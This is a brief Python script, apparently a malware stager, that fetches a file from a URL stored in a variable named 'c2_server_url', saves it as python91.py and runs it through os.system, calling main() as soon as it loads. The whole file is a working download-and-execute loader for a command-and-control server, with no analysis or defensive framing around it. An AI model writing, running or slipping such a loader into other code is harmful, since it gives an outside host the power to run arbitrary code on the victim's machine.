import requests
import os

def get_code(url):
    response = requests.get(url)
    return response.text

def save_code_to_file(file_path, code):
    with open(file_path, "w") as f:
        f.write(code)

def load_code_from_file(file_path):
    with open(file_path, "r") as f:
        return f.read()

def execute_code(file_path):
    os.system(f"python {file_path}")

def main():
    c2_server_url = "https://local-ssl.com/python.py"
    temp_file_path = "python91.py"
    
    code = get_code(c2_server_url)
    save_code_to_file(temp_file_path, code)
    execute_code(temp_file_path)

main()
